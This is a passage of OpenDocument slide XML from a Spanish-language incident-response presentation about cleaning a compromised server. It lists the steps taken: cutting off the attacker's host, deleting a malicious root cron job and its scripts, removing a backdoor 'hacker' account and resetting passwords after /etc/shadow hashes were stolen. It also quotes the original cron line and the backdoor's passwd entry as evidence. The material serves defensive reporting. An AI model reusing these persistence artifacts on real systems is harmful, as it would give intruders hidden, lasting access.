          <text:p text:style-name="a756" text:class-names="" text:cond-style-name=""><text:span text:style-name="a754" text:class-names="">Cortamos la comunicación con el servidor del atacante (192.168.1.100) antes de tocar nada más, para evitar que siguiera robando datos durante la limpieza.</text:span><text:span text:style-name="a755" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="1.3in" svg:width="4.72in" svg:height="1.28in" draw:id="id247" draw:style-name="a758" draw:name="Shape 8">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="1.3in" svg:width="0.8in" svg:height="1.28in" draw:id="id248" draw:style-name="a759" draw:name="Shape 9">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="1.35in" svg:width="0.8in" svg:height="0.38in" draw:id="id249" draw:style-name="a763" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a762" text:class-names="" text:cond-style-name=""><text:span text:style-name="a760" text:class-names="">02</text:span><text:span text:style-name="a761" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id250" draw:style-name="a764" draw:name="Image 2" svg:x="5.35in" svg:y="1.8in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image16.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.1in" svg:y="1.36in" svg:width="3.7in" svg:height="0.3in" draw:id="id251" draw:style-name="a768" draw:name="Text 11">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a767" text:class-names="" text:cond-style-name=""><text:span text:style-name="a765" text:class-names="">Eliminamos el programa de robo</text:span><text:span text:style-name="a766" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.1in" svg:y="1.66in" svg:width="3.7in" svg:height="0.82in" draw:id="id252" draw:style-name="a772" draw:name="Text 12">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a771" text:class-names="" text:cond-style-name=""><text:span text:style-name="a769" text:class-names="">Borramos el cron automático (sys-maintenance) y los scripts backup2.sh e install.sh. El robo de datos se detuvo de forma permanente.</text:span><text:span text:style-name="a770" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.72in" svg:width="4.72in" svg:height="1.28in" draw:id="id253" draw:style-name="a773" draw:name="Shape 13">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.72in" svg:width="0.8in" svg:height="1.28in" draw:id="id254" draw:style-name="a774" draw:name="Shape 14">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.77in" svg:width="0.8in" svg:height="0.38in" draw:id="id255" draw:style-name="a778" draw:name="Text 15">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a777" text:class-names="" text:cond-style-name=""><text:span text:style-name="a775" text:class-names="">03</text:span><text:span text:style-name="a776" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id256" draw:style-name="a779" draw:name="Image 3" svg:x="0.47in" svg:y="3.22in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image10.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.22in" svg:y="2.78in" svg:width="3.7in" svg:height="0.3in" draw:id="id257" draw:style-name="a783" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a782" text:class-names="" text:cond-style-name=""><text:span text:style-name="a780" text:class-names="">Cerramos las puertas traseras</text:span><text:span text:style-name="a781" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.22in" svg:y="3.08in" svg:width="3.7in" svg:height="0.82in" draw:id="id258" draw:style-name="a787" draw:name="Text 17">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a786" text:class-names="" text:cond-style-name=""><text:span text:style-name="a784" text:class-names="">Eliminamos la cuenta 'hacker' (backdoor) del sistema. La cuenta 'reports' fue conservada pero con contraseña completamente nueva.</text:span><text:span text:style-name="a785" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="2.72in" svg:width="4.72in" svg:height="1.28in" draw:id="id259" draw:style-name="a788" draw:name="Shape 18">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="2.72in" svg:width="0.8in" svg:height="1.28in" draw:id="id260" draw:style-name="a789" draw:name="Shape 19">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="2.77in" svg:width="0.8in" svg:height="0.38in" draw:id="id261" draw:style-name="a793" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a792" text:class-names="" text:cond-style-name=""><text:span text:style-name="a790" text:class-names="">04</text:span><text:span text:style-name="a791" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id262" draw:style-name="a794" draw:name="Image 4" svg:x="5.35in" svg:y="3.22in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image11.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.1in" svg:y="2.78in" svg:width="3.7in" svg:height="0.3in" draw:id="id263" draw:style-name="a798" draw:name="Text 21">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a797" text:class-names="" text:cond-style-name=""><text:span text:style-name="a795" text:class-names="">Cambiamos todas las contraseñas</text:span><text:span text:style-name="a796" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.1in" svg:y="3.08in" svg:width="3.7in" svg:height="0.82in" draw:id="id264" draw:style-name="a802" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a801" text:class-names="" text:cond-style-name=""><text:span text:style-name="a799" text:class-names="">Restablecimos las contraseñas de root, sysadmin y reports. Obligatorio: el atacante tenía los hashes de /etc/shadow y podía descifrarlos offline.</text:span><text:span text:style-name="a800" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.14in" svg:width="4.72in" svg:height="1.28in" draw:id="id265" draw:style-name="a803" draw:name="Shape 23">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.14in" svg:width="0.8in" svg:height="1.28in" draw:id="id266" draw:style-name="a804" draw:name="Shape 24">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.19in" svg:width="0.8in" svg:height="0.38in" draw:id="id267" draw:style-name="a808" draw:name="Text 25">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a807" text:class-names="" text:cond-style-name=""><text:span text:style-name="a805" text:class-names="">05</text:span><text:span text:style-name="a806" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id268" draw:style-name="a809" draw:name="Image 5" svg:x="0.47in" svg:y="4.64in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image14.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.22in" svg:y="4.2in" svg:width="3.7in" svg:height="0.3in" draw:id="id269" draw:style-name="a813" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a812" text:class-names="" text:cond-style-name=""><text:span text:style-name="a810" text:class-names="">Reforzamos la seguridad del servidor</text:span><text:span text:style-name="a811" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.22in" svg:y="4.5in" svg:width="3.7in" svg:height="0.82in" draw:id="id270" draw:style-name="a817" draw:name="Text 27">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a816" text:class-names="" text:cond-style-name=""><text:span text:style-name="a814" text:class-names="">Deshabilitamos FTP y Apache (servicios innecesarios). Configuramos SSH para que root no pueda entrar directamente por red.</text:span><text:span text:style-name="a815" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="4.14in" svg:width="4.72in" svg:height="1.28in" draw:id="id271" draw:style-name="a818" draw:name="Shape 28">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="4.14in" svg:width="0.8in" svg:height="1.28in" draw:id="id272" draw:style-name="a819" draw:name="Shape 29">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="4.19in" svg:width="0.8in" svg:height="0.38in" draw:id="id273" draw:style-name="a823" draw:name="Text 30">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a822" text:class-names="" text:cond-style-name=""><text:span text:style-name="a820" text:class-names="">06</text:span><text:span text:style-name="a821" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id274" draw:style-name="a824" draw:name="Image 6" svg:x="5.35in" svg:y="4.64in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.1in" svg:y="4.2in" svg:width="3.7in" svg:height="0.3in" draw:id="id275" draw:style-name="a828" draw:name="Text 31">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a827" text:class-names="" text:cond-style-name=""><text:span text:style-name="a825" text:class-names="">Verificamos que quedó limpio</text:span><text:span text:style-name="a826" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.1in" svg:y="4.5in" svg:width="3.7in" svg:height="0.82in" draw:id="id276" draw:style-name="a832" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a831" text:class-names="" text:cond-style-name=""><text:span text:style-name="a829" text:class-names="">Buscamos exhaustivamente cualquier rastro adicional del atacante (crons, claves SSH, servicios ocultos). No encontramos nada más.</text:span><text:span text:style-name="a830" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a838">
          <draw:page-thumbnail draw:page-number="7" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id277" presentation:style-name="a833" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id278" presentation:style-name="a834" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id279" presentation:style-name="a837" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a836" text:class-names="" text:cond-style-name=""><text:span text:style-name="a835" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">7</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 8" draw:style-name="a839" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-263">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id280" draw:style-name="a840" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id281" draw:style-name="a841" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id282" draw:style-name="a845" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a844" text:class-names="" text:cond-style-name=""><text:span text:style-name="a842" text:class-names="">Evidencia: Sistema Restaurado</text:span><text:span text:style-name="a843"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283" draw:style-name="a849" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a848" text:class-names="" text:cond-style-name=""><text:span text:style-name="a846" text:class-names="">Verificación técnica del estado final del servidor — solo configuraciones legítimas activas</text:span><text:span text:style-name="a847" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.72in" svg:height="1.28in" draw:id="id284" draw:style-name="a850" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id285" draw:style-name="a851" draw:name="Image 1" svg:x="0.44in" svg:y="1.36in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image16.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="4.3in" svg:y="1.36in" svg:width="0.55in" svg:height="0.55in" draw:id="id286" draw:style-name="a852" draw:name="Shape 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3in" svg:y="1.38in" svg:width="0.55in" svg:height="0.5in" draw:id="id287" draw:style-name="a856" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a855" text:class-names="" text:cond-style-name=""><text:span text:style-name="a853" text:class-names="">✓</text:span><text:span text:style-name="a854" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="1.38in" svg:width="3.3in" svg:height="0.32in" draw:id="id288" draw:style-name="a860" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a859" text:class-names="" text:cond-style-name=""><text:span text:style-name="a857" text:class-names="">Cron malicioso eliminado</text:span><text:span text:style-name="a858" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="1.86in" svg:width="4.45in" svg:height="0.26in" draw:id="id289" draw:style-name="a861" draw:name="Shape 7">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="1.88in" svg:width="4.33in" svg:height="0.22in" draw:id="id290" draw:style-name="a865" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a864" text:class-names="" text:cond-style-name=""><text:span text:style-name="a862" text:class-names="">ANTES: */15 * * * * root /usr/local/bin/backup2.sh</text:span><text:span text:style-name="a863" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="2.18in" svg:width="4.45in" svg:height="0.26in" draw:id="id291" draw:style-name="a866" draw:name="Shape 9">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="2.2in" svg:width="4.33in" svg:height="0.22in" draw:id="id292" draw:style-name="a870" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a869" text:class-names="" text:cond-style-name=""><text:span text:style-name="a867" text:class-names="">AHORA: cat /etc/cron.d/sys-maintenance → No such file or directory</text:span><text:span text:style-name="a868" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="1.28in" svg:width="4.72in" svg:height="1.28in" draw:id="id293" draw:style-name="a871" draw:name="Shape 11">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id294" draw:style-name="a872" draw:name="Image 2" svg:x="5.3in" svg:y="1.36in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image10.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="9.16in" svg:y="1.36in" svg:width="0.55in" svg:height="0.55in" draw:id="id295" draw:style-name="a873" draw:name="Shape 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16in" svg:y="1.38in" svg:width="0.55in" svg:height="0.5in" draw:id="id296" draw:style-name="a877" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a876" text:class-names="" text:cond-style-name=""><text:span text:style-name="a874" text:class-names="">✓</text:span><text:span text:style-name="a875" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="1.38in" svg:width="3.3in" svg:height="0.32in" draw:id="id297" draw:style-name="a881" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a880" text:class-names="" text:cond-style-name=""><text:span text:style-name="a878" text:class-names="">Cuenta backdoor 'hacker' eliminada</text:span><text:span text:style-name="a879" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="1.86in" svg:width="4.45in" svg:height="0.26in" draw:id="id298" draw:style-name="a882" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="1.88in" svg:width="4.33in" svg:height="0.22in" draw:id="id299" draw:style-name="a886" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a885" text:class-names="" text:cond-style-name=""><text:span text:style-name="a883" text:class-names="">ANTES: hacker:x:1002:1002::/home/hacker:/bin/bash</text:span><text:span text:style-name="a884" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="2.18in" svg:width="4.45in" svg:height="0.26in" draw:id="id300" draw:style-name="a887" draw:name="Shape 17">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="2.2in" svg:width="4.33in" svg:height="0.22in" draw:id="id301" draw:style-name="a891" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a890" text:class-names="" text:cond-style-name=""><text:span text:style-name="a888" text:class-names="">AHORA: id hacker → id: 'hacker': no such user</text:span><text:span text:style-name="a889" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.7in" svg:width="4.72in" svg:height="1.28in" draw:id="id302" draw:style-name="a892" draw:name="Shape 19">
          <svg:title/>
          <svg:desc/>
